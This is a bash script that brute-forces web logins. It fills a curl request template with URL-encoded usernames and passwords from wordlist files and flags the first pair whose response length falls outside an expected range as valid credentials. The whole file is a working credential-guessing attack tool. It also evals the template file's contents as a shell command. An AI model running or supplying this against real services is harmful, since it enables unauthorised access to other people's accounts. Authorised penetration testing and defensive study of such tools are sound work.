#!/bin/bash

curlbase=`cat $1`

# Usernames
for username in $(cat $2); do

	enc_usr=`echo "$username" | urlencode.py`
	withpwd=${curlbase//@username@/$enc_usr}

	# Passwords
	for password in $(cat $3); do

		enc_pwd=`echo "$password" | urlencode.py`

		curl="${withpwd/@password@/$enc_pwd}"

		echo -n "$username:$password:"
		result=`eval "$curl | wc -c | tr -d ' '"`
		echo "$result"

		if (( $result < $(($4-$5)) )) || (( $result > $(($4+$5)) ));
		then
			echo "FINISHED!"
			echo "Username '$username' with password '$password' seem to be the correct credentials."
			exit
		fi

	done

done

